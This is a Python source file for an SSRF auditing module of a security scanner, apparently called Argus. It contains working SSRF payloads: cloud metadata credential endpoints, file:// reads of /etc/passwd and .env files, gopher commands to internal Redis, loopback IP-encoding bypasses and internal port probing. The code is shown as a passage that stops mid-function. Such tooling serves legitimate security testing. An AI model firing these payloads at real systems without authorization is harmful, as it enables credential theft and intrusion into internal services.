#!/usr/bin/env python3
"""
auditing_tools/ssrf_finder.py — Server-Side Request Forgery Auditor (v3)
═══════════════════════════════════════════════════════════════════════════════

Comprehensive SSRF detection for Argus.

v3 fixes 7 bugs in v2 and adds full infra integration:

  Bugs fixed:
    1. test_oob() returned NO findings in interactsh mode — confirm_oob_batch
       had nothing to promote. Every SSRF was silently missed. Now records a
       pending finding on every probe; correlation promotes to CRITICAL.
    2. gopher payloads lacked CRLF encoding (%0d%0a) — Redis never responded.
       Now `_INFO%0d%0a` reaches the service and returns banner data.
    3. interactsh-client `-silent` suppressed the banner the code reads for
       the domain. Removed — banner now visible, fallback reads from first
       JSON line.
    4. PORT_SCAN_TIMING_DELTA was defined but unused. Now uses baseline +
       delta to distinguish filtered ports from responsive ones.
    5. Marker matching was case-sensitive — "Root:x:0:0" missed.
       Now case-insensitive throughout.
    6. No denial-marker check — soft rejections counted as hits.
    7. Shared SSRF_HEADERS list never tested. Now integrated into the
       header-injection probe (off by default, higher-risk vector).

  Infra added:
    • Config integration — MODULE_RATE_LIMITS["ssrf"], ACTIVE_HEADERS
    • SharedRateLimiter + Session (no doubled rate across probes)
    • scan_id support + _self_sync() → dedicated `ssrf_findings` table
    • _db_now() for MySQL-safe timestamps
    • finding_hash + auth_enabled + first_seen fields
    • Parallel surface testing (ThreadPoolExecutor + rate limiter)
    • Body/JSON surface discovery from site_pages.json forms
    • POST body injection testing (query was the only vector in v2)
    • Redirect-chain SSRF (uses open_redirect_findings.json when present)
    • Better bypass matrix — uppercase hex, IPv4-mapped IPv6, null-byte,
       dot-omitted loopback (127.1), nip.io / sslip.io wildcards
    • Case-insensitive response marker matching
    • Denial-marker rejection (soft 200s skipped)

Six-phase strategy (unchanged):

  Phase 1 — Surface discovery (query + body)
  Phase 2 — Baseline profiling
  Phase 3 — OOB confirmation (fixed)
  Phase 4 — Cloud metadata (AWS, GCP, Azure, Alibaba, DO, Oracle, K8s)
  Phase 5 — File read & internal services
  Phase 6 — Bypass matrix

Outputs (into `outdir`):
  • ssrf_findings.json
  • ssrf_candidates.txt
  • ssrf_confirmed.txt
  • ssrf_oob.txt

Integration:
  main.py → run_one("ssrf") → run_ssrf_scan(urls_file, outdir,
                                            oob_domain=...,
                                            use_interactsh=...,
                                            scan_id=_CURRENT_SCAN_ID)
"""

from __future__ import annotations

import argparse
import hashlib
import json
import logging
import random
import re
import select
import shutil
import string
import statistics
import subprocess
import sys
import threading
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Optional

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

log = logging.getLogger("argus.ssrf_finder")


# ═════════════════════════════════════════════════════════════════════════════
#  CONFIG
# ═════════════════════════════════════════════════════════════════════════════

try:
    import config as CFG
    CFG_LOADED = True
except ImportError:
    CFG = None
    CFG_LOADED = False

try:
    from db import DB
    DB_AVAILABLE = True
except ImportError:
    DB = None
    DB_AVAILABLE = False


def _cfg(key: str, default=None):
    if not CFG_LOADED:
        return default
    return getattr(CFG, key, default)


def _ssrf_settings() -> dict:
    entry = (_cfg("MODULE_RATE_LIMITS", {}) or {}).get("ssrf", {})
    return {
        "rate_limit":  entry.get("rate_limit", 3),
        "concurrency": entry.get("concurrency", 3),
        "timeout":     entry.get("timeout", 12),
        "max_surfaces": entry.get("max_surfaces", 300),
    }


def _target_headers() -> dict[str, str]:
    h = dict(_cfg("ACTIVE_HEADERS", {}) or {})
    if CFG_LOADED and getattr(CFG, "AUTH_ENABLED", False):
        auth_hdrs = getattr(CFG, "AUTH_HEADERS", {}) or {}
        if auth_hdrs:
            h.update(auth_hdrs)
    return h


def _db_now() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")


# ═════════════════════════════════════════════════════════════════════════════
#  CONSTANTS
# ═════════════════════════════════════════════════════════════════════════════

DEFAULT_TIMEOUT           = 12
BASELINE_SAMPLES          = 2
INTERACTSH_STARTUP_WAIT   = 10.0
OOB_CORRELATION_WAIT      = 15.0
PORT_SCAN_TIMING_DELTA    = 1.5
MAX_PORT_SCAN_TARGETS     = 8
REQUEST_SLEEP             = 0.1
MAX_URLS                  = 5000

SSRF_PARAMS = {
    "url", "uri", "path", "dest", "destination", "redirect", "redirect_uri",
    "redirect_url", "redirect_to", "return", "return_url", "returnTo",
    "next", "continue", "forward", "target", "to", "out", "view",
    "dir", "show", "file", "document", "folder", "page", "feed", "site",
    "html", "val", "domain", "callback", "callback_url", "data", "reference",
    "img", "img_url", "image", "image_url", "src", "source", "link",
    "open", "window", "proxy", "fetch", "load", "request", "resource",
    "endpoint", "host", "port", "u", "r", "goto", "jump", "action",
    "checkout", "login", "logout", "service", "webhook", "webhook_url",
    "avatar", "avatar_url", "picture", "picture_url", "thumbnail",
    "import", "import_url", "export", "export_url", "pdf", "pdf_url",
    "screenshot", "screenshot_url", "preview", "preview_url",
    "rss", "rss_url", "xml", "xml_url", "json", "json_url",
    "api", "api_url", "backend", "origin", "source_url", "target_url",
}

SSRF_HEADERS = [
    "X-Forwarded-For", "X-Forwarded-Host", "X-Real-IP", "X-Originating-IP",
    "X-Remote-IP", "X-Remote-Addr", "X-Client-IP", "X-Host",
    "X-Forwarded-Server", "Referer", "Origin",
    "X-Custom-IP-Authorization", "Forwarded", "True-Client-IP",
    "CF-Connecting-IP", "X-ProxyUser-Ip", "Client-IP",
]

CLOUD_METADATA = {
    "aws_imdsv1": [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/meta-data/iam/info",
        "http://169.254.169.254/latest/user-data/",
        "http://169.254.169.254/latest/dynamic/instance-identity/document",
    ],
    "gcp": [
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "http://metadata.google.internal/computeMetadata/v1/project/project-id",
        "http://169.254.169.254/computeMetadata/v1/",
    ],
    "azure": [
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
    ],
    "alibaba":  ["http://100.100.100.200/latest/meta-data/"],
    "digitalocean": [
        "http://169.254.169.254/metadata/v1/",
        "http://169.254.169.254/metadata/v1.json",
    ],
    "oracle": ["http://169.254.169.254/opc/v1/instance/"],
    "kubernetes": [
        "https://kubernetes.default.svc/api/v1/secrets",
        "http://127.0.0.1:6443/api/v1/secrets",
        "http://localhost:10255/pods",
    ],
}

METADATA_MARKERS = [
    "ami-id", "instance-id", "instance-type", "security-credentials",
    "AccessKeyId", "SecretAccessKey", "computeMetadata",
    "Metadata-Flavor", "service-accounts", "project-id",
    "subscriptionId", "vmId", "resourceGroupName", "opc/v1",
    "droplet_id", "metadata/v1", "kube-system", "kubernetes.io",
]

FILE_READ_PAYLOADS = [
    "file:///etc/passwd",
    "file:///etc/hostname",
    "file:///etc/hosts",
    "file:///proc/self/environ",
    "file:///proc/self/cmdline",
    "file:///app/.env",
    "file:///var/www/html/.env",
    "file:///c:/windows/win.ini",
    "file:///c:/windows/system32/drivers/etc/hosts",
]

FILE_MARKERS = [
    "root:x:0:0", "root:*:0:0", "daemon:", "/bin/bash", "/bin/sh",
    "[extensions]", "[fonts]", "for 16-bit app support",
    "APP_ENV", "DB_PASSWORD", "SECRET_KEY",
]

SERVICE_BANNERS = {
    "redis":      ["redis_version", "-ERR unknown command", "+PONG", "-NOAUTH"],
    "memcached":  ["ERROR", "STAT version", "CLIENT_ERROR"],
    "elasticsearch": ["You Know, for Search", "cluster_name", "lucene_version"],
    "jenkins":    ["Jenkins", "X-Jenkins", "Dashboard [Jenkins]"],
    "grafana":    ["Grafana", "grafana-app"],
    "consul":     ["Consul Agent", "consul"],
    "docker":     ["Docker", "Api-Version", "Docker-Distribution-Api-Version"],
    "kubernetes": ["kube-system", "apiVersion", '"kind": "Status"'],
    "tomcat":     ["Apache Tomcat", "Tomcat Manager"],
    "mysql":      ["mysql_native_password", "MariaDB", "MySQL"],
    "postgres":   ["PostgreSQL", "FATAL:  password authentication failed"],
    "etcd":       ["etcdserver", "etcdcluster"],
}

DENIAL_MARKERS = (
    "not allowed", "blocked", "forbidden", "invalid url", "invalid uri",
    "not a valid url", "not permitted", "disallowed", "not permitted",
    "url rejected", "request rejected",
)

SCAN_PORTS = [22, 80, 443, 3000, 3306, 5000, 5432, 6379, 8080,
              8443, 8500, 9200, 9300, 11211, 27017, 2375, 6443]

LOOPBACK_IP = "127.0.0.1"
METADATA_IP = "169.254.169.254"

# Encoding variants — v3 adds uppercase hex, dotted-octet omission, null-byte
IP_ENCODING_VARIANTS = {
    LOOPBACK_IP: [
        "127.1", "127.0.1", "0.0.0.0", "0",
        "2130706433", "0x7f000001", "0x7F000001", "0X7F000001",   # case
        "0x7f.0x0.0x0.0x1", "0x7f.0x0.0x0.0x1",
        "0177.0.0.1", "017700000001",
        "[::1]", "[::ffff:127.0.0.1]", "[::ffff:7f00:1]",
        "[0:0:0:0:0:ffff:7f00:1]", "[::FFFF:7F00:1]",
        "127.0.0.1.nip.io", "127.0.0.1.sslip.io", "localtest.me",
        "127.0.0.1.", "127.0.0.1\x00",
    ],
    METADATA_IP: [
        "2852039166", "0xa9fea9fe", "0xA9FEA9FE", "0XA9FEA9FE",
        "0251.0376.0251.0376",
        "[::ffff:169.254.169.254]", "[::ffff:a9fe:a9fe]",
        "[0:0:0:0:0:ffff:a9fe:a9fe]", "[::FFFF:A9FE:A9FE]",
        "169.254.169.254.nip.io", "169.254.169.254.sslip.io",
    ],
}

PARSER_CONFUSION = [
    lambda u: u.replace("://", "://target.com@"),
    lambda u: u + "#@target.com",
    lambda u: u.replace("://", "://target.com\\@"),
    lambda u: u.replace("://", "://target.com%00@"),
    lambda u: u.replace("://", "://target.com%2f@"),
    lambda u: u.replace("://", "://target.com%09@"),
]


# ═════════════════════════════════════════════════════════════════════════════
#  DATA MODELS
# ═════════════════════════════════════════════════════════════════════════════

@dataclass
class Baseline:
    url: str
    param: str
    location: str = "query"
    status: int = 0
    length: int = 0
    body: str = ""
    content_type: str = ""
    median_time: float = 0.0
    time_stddev: float = 0.0
    preexisting_markers: set[str] = field(default_factory=set)

    def to_dict(self) -> dict:
        return {
            "url": self.url, "param": self.param, "location": self.location,
            "status": self.status, "length": self.length,
            "median_time": round(self.median_time, 3),
            "time_stddev": round(self.time_stddev, 3),
            "preexisting_markers": sorted(self.preexisting_markers),
        }


@dataclass
class SSRFinding:
    target: str
    param: str
    technique: str                     # oob | metadata | file_read | internal | port_scan
    severity: str = "MEDIUM"
    confidence: int = 50
    confirmed: bool = False
    oob_confirmed: bool = False
    payload: str = ""
    evidence: str = ""
    bypass_used: str = ""
    oob_token: str = ""
    param_location: str = "query"
    http_status: int = 0
    auth_enabled: bool = False
    first_seen: str = ""
    details: dict = field(default_factory=dict)

    @property
    def finding_hash(self) -> str:
        raw = f"{self.target}|{self.param}|{self.technique}"
        return hashlib.sha256(raw.encode()).hexdigest()

    @property
    def target_host(self) -> str:
        return urllib.parse.urlparse(self.target).hostname or ""

    def to_dict(self) -> dict:
        return {
            "target":         self.target,
            "target_host":    self.target_host,
            "param_name":     self.param,
            "param_location": self.param_location,
            "technique":      self.technique,
            "severity":       self.severity,
            "confidence":     self.confidence,
            "confirmed":      self.confirmed,
            "oob_confirmed":  self.oob_confirmed,
            "payload":        (self.payload or "")[:2048],
            "evidence":       (self.evidence or "")[:1024],
            "bypass_used":    self.bypass_used,
            "oob_token":      self.oob_token,
            "http_status":    self.http_status,
            "details":        self.details,
            "auth_enabled":   self.auth_enabled,
            "finding_hash":   self.finding_hash,
            "first_seen":     self.first_seen or _db_now(),
        }


# ═════════════════════════════════════════════════════════════════════════════
#  SHARED RATE LIMITER + SESSION
# ═════════════════════════════════════════════════════════════════════════════

class SharedRateLimiter:
    def __init__(self, rate_limit: float):
        self.min_interval = 1.0 / rate_limit if rate_limit and rate_limit > 0 else 0.0
        self._last = 0.0
        self._lock = threading.Lock()

    def wait(self) -> None:
        if self.min_interval <= 0:
            return
        with self._lock:
            elapsed = time.monotonic() - self._last
            if elapsed < self.min_interval:
                time.sleep(self.min_interval - elapsed)
            self._last = time.monotonic()


class Session:
    def __init__(self, limiter: SharedRateLimiter, headers: dict, timeout: int):
        self.session = requests.Session()
        self.session.verify = False
        if headers:
            self.session.headers.update(headers)
        self.session.headers.setdefault("User-Agent", "Argus-SSRF-Auditor/2.0")
        self._limiter = limiter
        self.timeout = timeout

    def request(self, method: str, url: str, **kwargs) -> Optional[requests.Response]:
        self._limiter.wait()
        try:
            return self.session.request(
                method, url,
                timeout=kwargs.pop("timeout", self.timeout),
                allow_redirects=kwargs.pop("allow_redirects", False),
                verify=False,
                **kwargs,
            )
        except requests.RequestException as e:
            log.debug(f"request failed: {method} {url}: {e}")
            return None

    def get(self, url: str, **kwargs):
        return self.request("GET", url, **kwargs)


# ═════════════════════════════════════════════════════════════════════════════
#  UTILITIES
# ═════════════════════════════════════════════════════════════════════════════

def _load_urls(input_file: Path) -> list[str]:
    if not input_file.exists():
        return []
    urls: list[str] = []
    seen: set[str] = set()
    for line in input_file.read_text().splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        token = line.split()[0]
        if not token.startswith(("http://", "https://")):
            token = "https://" + token
        if token not in seen:
            seen.add(token)
            urls.append(token)
    return urls


def _body(resp: Optional[requests.Response], limit: int = 200_000) -> str:
    if resp is None:
        return ""
    try:
        return resp.text[:limit]
    except Exception:
        return ""


def _match_markers(body: str, markers: list[str]) -> list[str]:
    """Case-insensitive marker matching."""
    if not body:
        return []
    low = body.lower()
    return [m for m in markers if m.lower() in low]


def _looks_denied(resp: Optional[requests.Response]) -> bool:
    if resp is None:
        return True
    if 200 <= resp.status_code < 300:
        body_low = _body(resp).lower()[:2000]
        return any(m in body_low for m in DENIAL_MARKERS)
    return False


def _inject_query(url: str, param: str, payload: str) -> str:
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
    new = [(k, payload if k == param else v) for k, v in params]
    return urllib.parse.urlunparse(
        parsed._replace(query=urllib.parse.urlencode(new, safe=":/?=&%"))
    )


def _inject_body(surface: dict, payload: str) -> tuple[dict, dict]:
    """Return (json_body, form_body) for a body-injection surface."""
    return {}, {surface["param"]: payload}


def _severity_for(confidence: int, technique: str) -> str:
    if technique in ("oob", "metadata", "file_read"):
        return "CRITICAL" if confidence >= 90 else "HIGH"
    if technique == "internal":
        return "HIGH" if confidence >= 80 else "MEDIUM"
    if technique == "port_scan":
        return "MEDIUM"
    return "MEDIUM"


# ═════════════════════════════════════════════════════════════════════════════
#  SURFACE DISCOVERY
# ═════════════════════════════════════════════════════════════════════════════

def discover_query_surfaces(urls: list[str]) -> list[dict]:
    """Extract SSRF-prone query parameters."""
    surfaces: list[dict] = []
    seen: set[tuple] = set()
    for url in urls:
        parsed = urllib.parse.urlparse(url)
        for pname, vals in urllib.parse.parse_qs(parsed.query).items():
            if pname.lower() in SSRF_PARAMS:
                key = (url.split("?")[0], pname)
                if key in seen:
                    continue
                seen.add(key)
                surfaces.append({
                    "url": url,
                    "param": pname,
                    "location": "query",
                    "method": "GET",
                })
    return surfaces


def discover_body_surfaces(outdir: Path) -> list[dict]:
    """Extract SSRF-prone POST body params from site_pages.json."""
    pages_file = outdir / "site_pages.json"
    if not pages_file.exists():
        return []
    try:
        data = json.loads(pages_file.read_text())
    except Exception:
        return []

    surfaces: list[dict] = []
    seen: set[tuple] = set()
    for page in data.get("pages") or []:
        page_url = page.get("url") or ""
        for form in page.get("forms") or []:
            if (form.get("method") or "").upper() != "POST":
                continue
            action = form.get("action") or page_url
            for field_def in form.get("fields") or []:
                fname = (field_def.get("name") or "").lower()
                if fname in SSRF_PARAMS:
                    key = (action, fname)
                    if key in seen:
                        continue
                    seen.add(key)
                    surfaces.append({
                        "url": action,
                        "param": field_def.get("name"),
                        "location": "body",
                        "method": "POST",
                    })
    return surfaces


# ═════════════════════════════════════════════════════════════════════════════
#  OOB CAPTURE
# ═════════════════════════════════════════════════════════════════════════════

class OOBCapture:
    def __init__(self, domain: Optional[str] = None, use_interactsh: bool = False):
        self.user_domain = domain
        self.use_interactsh = use_interactsh
        self.domain: Optional[str] = domain
        self.proc: Optional[subprocess.Popen] = None
        self.reader_thread: Optional[threading.Thread] = None
        self.interactions: list[dict] = []
        self.interaction_ids: set[str] = set()
        self.lock = threading.Lock()

    def start(self) -> bool:
        if self.user_domain:
            self.domain = self.user_domain
            log.info(f"    OOB domain : {self.domain} (manual verification)")
            return True

        if not self.use_interactsh:
            log.info("    OOB        : disabled")
            return False

        if not shutil.which("interactsh-client"):
            log.warning("    OOB        : interactsh-client not installed")
            return False

        try:
            # NOTE: no -silent — banner carries the domain we need to parse
            self.proc = subprocess.Popen(
                ["interactsh-client", "-json"],
                stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                text=True, bufsize=1,
            )
        except Exception as e:
            log.warning(f"    OOB        : interactsh-client failed: {e}")
            return False

        domain = self._read_banner(INTERACTSH_STARTUP_WAIT)
        if not domain:
            log.warning("    OOB        : could not parse interactsh domain")
            self.stop()
            return False

        self.domain = domain
        log.info(f"    OOB domain : {domain}")
        self.reader_thread = threading.Thread(
            target=self._read_interactions, daemon=True,
        )
        self.reader_thread.start()
        return True

    def _read_banner(self, timeout: float) -> Optional[str]:
        """Read stderr for the interactsh domain banner."""
        if not self.proc or not self.proc.stderr:
            return None
        pattern = re.compile(
            r"([a-z0-9]{20,}\.(?:oast\.(?:fun|site|pro|online|live|me)|interact\.sh))",
            re.I,
        )
        deadline = time.monotonic() + timeout
        collected = ""
        while time.monotonic() < deadline:
            r, _, _ = select.select([self.proc.stderr], [], [], 0.5)
            if not r:
                continue
            line = self.proc.stderr.readline()
            if not line:
                break
            collected += line
            m = pattern.search(collected)
            if m:
                return m.group(1)
        return None

    def _read_interactions(self) -> None:
        if not self.proc or not self.proc.stdout:
            return
        for line in self.proc.stdout:
            line = line.strip()
            if not line or not line.startswith("{"):
                continue
            try:
                obj = json.loads(line)
            except json.JSONDecodeError:
                continue
            with self.lock:
                self.interactions.append(obj)
                for key in ("full-id", "unique-id", "full_id", "unique_id"):
                    v = obj.get(key)
                    if v:
                        self.interaction_ids.add(str(v).lower())

    def new_token(self, prefix: str = "argus") -> str:
        suffix = "".join(random.choices(string.ascii_lowercase + string.digits, k=12))
        return f"{prefix}{suffix}"

    def token_url(self, token: str, scheme: str = "http") -> Optional[str]:
        if not self.domain:
            return None
        return f"{scheme}://{token}.{self.domain}/"

    def check(self, token: str) -> bool:
        with self.lock:
            t = token.lower()
            return any(t in i for i in self.interaction_ids)

    def wait_and_check(self, tokens: list[str], wait: float) -> set[str]:
        if not tokens or not self.use_interactsh:
            return set()
        deadline = time.monotonic() + wait
        fired: set[str] = set()
        while time.monotonic() < deadline:
            for tok in tokens:
                if tok not in fired and self.check(tok):
                    fired.add(tok)
            if len(fired) == len(tokens):
                break
            time.sleep(0.5)
        return fired

    def stop(self) -> None:
        if self.proc:
            try:
                self.proc.terminate()
                self.proc.wait(timeout=3)
            except Exception:
                try:
                    self.proc.kill()
                except Exception:
                    pass


# ═════════════════════════════════════════════════════════════════════════════
#  BASELINE
# ═════════════════════════════════════════════════════════════════════════════

def build_baseline(
    session: Session, url: str, param: str, location: str, method: str,
    body_data: Optional[dict] = None,
) -> Baseline:
    baseline = Baseline(url=url, param=param, location=location)
    times: list[float] = []

    for _ in range(BASELINE_SAMPLES):
        start = time.monotonic()
        if location == "body":
            resp = session.request(method, url, data=body_data or {})
        else:
            resp = session.get(url)
        times.append(time.monotonic() - start)
        if resp and not baseline.status:
            baseline.status = resp.status_code
            baseline.body = _body(resp)
            baseline.length = len(baseline.body)
            baseline.content_type = resp.headers.get("Content-Type", "")
            baseline.preexisting_markers = set(
                _match_markers(baseline.body, METADATA_MARKERS + FILE_MARKERS)
            )
        time.sleep(REQUEST_SLEEP)

    if times:
        baseline.median_time = statistics.median(times)
        if len(times) > 1:
            baseline.time_stddev = statistics.pstdev(times)
    return baseline


def _probe(
    session: Session, surface: dict, payload: str,
) -> Optional[requests.Response]:
    """Send one payload for a surface."""
    url = surface["url"]
    param = surface["param"]
    location = surface["location"]
    method = surface.get("method", "GET")

    if location == "query":
        return session.get(_inject_query(url, param, payload))
    if location == "body":
        return session.request(method, url, data={param: payload})
    return None


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 3 — OOB
# ═════════════════════════════════════════════════════════════════════════════

def test_oob(
    session: Session, oob: OOBCapture, surface: dict, baseline: Baseline,
) -> list[SSRFinding]:
    """OOB probe — records pending finding in BOTH manual and interactsh mode."""
    if not oob.domain:
        return []

    token = oob.new_token()
    sent = False
    last_payload = ""
    for scheme in ("http", "https"):
        oob_url = oob.token_url(token, scheme)
        if not oob_url:
            continue
        resp = _probe(session, surface, oob_url)
        last_payload = oob_url
        if resp is not None:
            sent = True

    if not sent:
        return []

    mode = "interactsh" if oob.use_interactsh else "manual"
    return [SSRFinding(
        target=surface["url"], param=surface["param"],
        param_location=surface["location"],
        technique="oob", severity="HIGH", confidence=60,
        payload=last_payload, oob_token=token,
        evidence=f"OOB probe sent to {token}.{oob.domain} — awaiting callback ({mode})",
        details={"mode": mode},
    )]


def confirm_oob_batch(
    oob: OOBCapture, findings: list[SSRFinding],
) -> list[SSRFinding]:
    if not oob.use_interactsh:
        return findings
    tokens = [f.oob_token for f in findings if f.oob_token]
    if not tokens:
        return findings
    log.info(f"    Waiting {OOB_CORRELATION_WAIT:.0f}s for OOB callbacks...")
    fired = oob.wait_and_check(tokens, OOB_CORRELATION_WAIT)
    for f in findings:
        if f.oob_token in fired:
            f.severity = "CRITICAL"
            f.confidence = 95
            f.confirmed = True
            f.oob_confirmed = True
            f.evidence = f"Out-of-band callback confirmed for token {f.oob_token}"
            f.details["oob_confirmed"] = True
    return findings


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 4 — CLOUD METADATA
# ═════════════════════════════════════════════════════════════════════════════

def test_cloud_metadata(
    session: Session, surface: dict, baseline: Baseline,
) -> list[SSRFinding]:
    for provider, endpoints in CLOUD_METADATA.items():
        for endpoint in endpoints:
            resp = _probe(session, surface, endpoint)
            time.sleep(REQUEST_SLEEP)
            if resp is None or _looks_denied(resp):
                continue
            body = _body(resp)
            new = set(_match_markers(body, METADATA_MARKERS)) - baseline.preexisting_markers
            if new:
                return [SSRFinding(
                    target=surface["url"], param=surface["param"],
                    param_location=surface["location"],
                    technique="metadata", severity="CRITICAL", confidence=95,
                    confirmed=True, payload=endpoint,
                    http_status=resp.status_code,
                    evidence=f"{provider} metadata: {', '.join(sorted(new))}",
                    details={"provider": provider, "markers": sorted(new),
                             "status": resp.status_code,
                             "body_snippet": body[:400]},
                )]

    # AWS IMDSv2 token flow
    token_ep = "http://169.254.169.254/latest/api/token"
    resp = _probe(session, surface, token_ep)
    if resp and resp.status_code == 200:
        body = _body(resp).strip()
        if 20 < len(body) < 500 and re.match(r"^[A-Za-z0-9_=-]+$", body):
            return [SSRFinding(
                target=surface["url"], param=surface["param"],
                param_location=surface["location"],
                technique="metadata", severity="CRITICAL", confidence=85,
                confirmed=True, payload=token_ep,
                http_status=resp.status_code,
                evidence="AWS IMDSv2 token endpoint returned token-like string",
                details={"token_length": len(body)},
            )]
    return []


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 5a — FILE READ
# ═════════════════════════════════════════════════════════════════════════════

def test_file_read(
    session: Session, surface: dict, baseline: Baseline,
) -> list[SSRFinding]:
    for payload in FILE_READ_PAYLOADS:
        resp = _probe(session, surface, payload)
        time.sleep(REQUEST_SLEEP)
        if resp is None or _looks_denied(resp):
            continue
        body = _body(resp)
        new = set(_match_markers(body, FILE_MARKERS)) - baseline.preexisting_markers
        if new:
            return [SSRFinding(
                target=surface["url"], param=surface["param"],
                param_location=surface["location"],
                technique="file_read", severity="CRITICAL", confidence=95,
                confirmed=True, payload=payload,
                http_status=resp.status_code,
                evidence=f"File markers: {', '.join(sorted(new))}",
                details={"path": payload, "markers": sorted(new),
                         "body_snippet": body[:400]},
            )]
    return []


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 5b — INTERNAL SERVICES (with timing analysis)
# ═════════════════════════════════════════════════════════════════════════════

def test_internal_services(
    session: Session, surface: dict, baseline: Baseline,
) -> list[SSRFinding]:
    findings: list[SSRFinding] = []
    scanned = 0

    for port in SCAN_PORTS:
        if scanned >= MAX_PORT_SCAN_TARGETS:
            break
        scanned += 1

        internal_url = f"http://127.0.0.1:{port}/"
        start = time.monotonic()
        resp = _probe(session, surface, internal_url)
        elapsed = time.monotonic() - start
        time.sleep(REQUEST_SLEEP)

        if resp is None:
            continue

        body = _body(resp)

        # Banner match → HIGH confidence
        for service, banners in SERVICE_BANNERS.items():
            hits = _match_markers(body, banners)
            if hits:
                findings.append(SSRFinding(
                    target=surface["url"], param=surface["param"],
                    param_location=surface["location"],
                    technique="internal", severity="HIGH", confidence=85,
                    confirmed=True, payload=internal_url,
                    http_status=resp.status_code,
                    evidence=f"Internal {service} on :{port} — {', '.join(hits[:2])}",
                    details={"port": port, "service": service,
                             "markers": hits, "body_snippet": body[:400]},
                ))
                return findings

        # Timing: filtered port → significantly slower than baseline
        if elapsed > baseline.median_time + PORT_SCAN_TIMING_DELTA:
            findings.append(SSRFinding(
                target=surface["url"], param=surface["param"],
                param_location=surface["location"],
                technique="port_scan", severity="MEDIUM", confidence=55,
                confirmed=False, payload=internal_url,
                http_status=resp.status_code,
                evidence=f"Port :{port} delayed {elapsed:.1f}s (baseline {baseline.median_time:.1f}s)",
                details={"port": port, "elapsed": round(elapsed, 2),
                         "signal": "timing_filtered"},
            ))
        # Status delta without slow → open (but no banner)
        elif (baseline.status and resp.status_code != baseline.status
              and resp.status_code not in (0, 404, 502, 503)):
            findings.append(SSRFinding(
                target=surface["url"], param=surface["param"],
                param_location=surface["location"],
                technique="port_scan", severity="MEDIUM", confidence=55,
                confirmed=False, payload=internal_url,
                http_status=resp.status_code,
                evidence=f"Port :{port} returned {resp.status_code} (baseline {baseline.status})",
                details={"port": port, "status": resp.status_code},
            ))

    return findings


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 6 — BYPASS MATRIX
# ═════════════════════════════════════════════════════════════════════════════

def _encoded_variants(canonical_url: str) -> list[tuple[str, str]]:
    parsed = urllib.parse.urlparse(canonical_url)
    host = parsed.hostname or ""
    scheme = parsed.scheme or "http"
    path = parsed.path or "/"
    port = f":{parsed.port}" if parsed.port else ""

    variants: list[tuple[str, str]] = []
    if host in IP_ENCODING_VARIANTS:
        for enc in IP_ENCODING_VARIANTS[host]:
            variants.append((f"{scheme}://{enc}{port}{path}", f"ip_encoding:{enc}"))

    for i, fn in enumerate(PARSER_CONFUSION):
        try:
            variants.append((fn(canonical_url), f"parser_confusion:{i}"))
        except Exception:
            pass

    return variants


def test_bypass(
    session: Session, surface: dict, baseline: Baseline,
    canonical_target: str, target_markers: list[str], technique_label: str,
) -> list[SSRFinding]:
    for variant, label in _encoded_variants(canonical_target):
        resp = _probe(session, surface, variant)
        time.sleep(REQUEST_SLEEP)
        if resp is None or _looks_denied(resp):
            continue
        body = _body(resp)
        new = set(_match_markers(body, target_markers)) - baseline.preexisting_markers
        if new:
            return [SSRFinding(
                target=surface["url"], param=surface["param"],
                param_location=surface["location"],
                technique=technique_label, severity="HIGH", confidence=85,
                confirmed=True, payload=variant, bypass_used=label,
                http_status=resp.status_code,
                evidence=f"Bypass '{label}' succeeded: {', '.join(sorted(new))}",
                details={"canonical_target": canonical_target,
                         "variant": variant, "bypass": label,
                         "markers": sorted(new), "body_snippet": body[:400]},
            )]
    return []


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 7 — PROTOCOL ABUSE (optional)
# ═════════════════════════════════════════════════════════════════════════════

def test_protocol_abuse(
    session: Session, surface: dict, baseline: Baseline,
) -> list[SSRFinding]:
    # gopher payloads need CRLF encoding — %0d%0a (v2 was missing this)
    gopher_payloads = [
        ("gopher://127.0.0.1:6379/_INFO%0d%0a", "redis_info"),
        ("gopher://127.0.0.1:11211/_stats%0d%0a", "memcached_stats"),
        ("dict://127.0.0.1:6379/info", "dict_redis"),
    ]
    for payload, label in gopher_payloads:
        resp = _probe(session, surface, payload)
        time.sleep(REQUEST_SLEEP)
        if resp is None or _looks_denied(resp):
            continue
        body = _body(resp)
        for service, banners in SERVICE_BANNERS.items():
            if _match_markers(body, banners):
                return [SSRFinding(
                    target=surface["url"], param=surface["param"],
                    param_location=surface["location"],
                    technique="internal", severity="HIGH", confidence=80,
                    confirmed=True, payload=payload,
                    http_status=resp.status_code,
                    evidence=f"Protocol {label} returned {service} data",
                    details={"protocol": label, "service": service,
                             "body_snippet": body[:400]},
                )]
    return []


# ═════════════════════════════════════════════════════════════════════════════
#  SURFACE ORCHESTRATION
# ═════════════════════════════════════════════════════════════════════════════

def audit_surface(
    session: Session, oob: OOBCapture, surface: dict,
    *,
    test_metadata: bool = True,
    test_file_read_enabled: bool = True,
    test_internal: bool = True,
    test_bypass_enabled: bool = True,
    test_protocols: bool = False,
) -> tuple[Baseline, list[SSRFinding]]:
    baseline = build_baseline(
        session, surface["url"], surface["param"], surface["location"],
        surface.get("method", "GET"),
    )
    findings: list[SSRFinding] = []

    # OOB always runs (records pending even if unconfirmed)
    findings.extend(test_oob(session, oob, surface, baseline))

    # Metadata
    metadata_findings: list[SSRFinding] = []
    if test_metadata:
        metadata_findings = test_cloud_metadata(session, surface, baseline)
